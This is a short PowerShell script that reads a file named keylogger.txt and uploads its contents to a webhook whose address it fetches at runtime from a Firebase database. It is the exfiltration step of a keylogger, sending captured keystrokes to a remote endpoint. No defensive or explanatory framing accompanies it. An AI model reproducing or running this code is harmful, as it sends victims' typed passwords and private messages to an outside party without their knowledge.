# Set the path to your text file
$file = "C:\temp\keylogger.txt"

# Read the content of the text file
$fileContent = Get-Content $file -Raw

# Set the webhook URL
$webhookUrl = $(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/webhook.json)

# Create a hashtable with the file content
$body = @{
    file_content = $fileContent
}

# Convert the hashtable to JSON
$jsonBody = $body | ConvertTo-Json

# Send the POST request to the webhook URL
$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"

# Check the response
if ($response) {
    Write-Host "File uploaded successfully!"
} else {
    Write-Host "Error uploading file."
}
